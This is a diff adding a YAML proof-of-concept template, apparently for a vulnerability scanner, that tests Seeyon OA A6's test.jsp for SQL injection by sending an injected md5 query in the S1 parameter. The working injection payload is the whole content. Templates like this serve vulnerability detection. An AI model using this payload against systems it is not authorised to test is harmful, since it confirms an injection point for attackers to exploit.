@@ -1,0 +1,22 @@
+id: poc-yaml-seeyon-a6-test-jsp-sql
+info:
+  name: 致远OA A6 test.jsp SQL注入漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 致远互联-OA
+  reference: []
+  description: null
+variables:
+  rand: random_int(10000, 21000)
+transport: http
+requests:
+- method: GET
+  path: /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{.rand}}))
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, md5(rand))
+  output: []
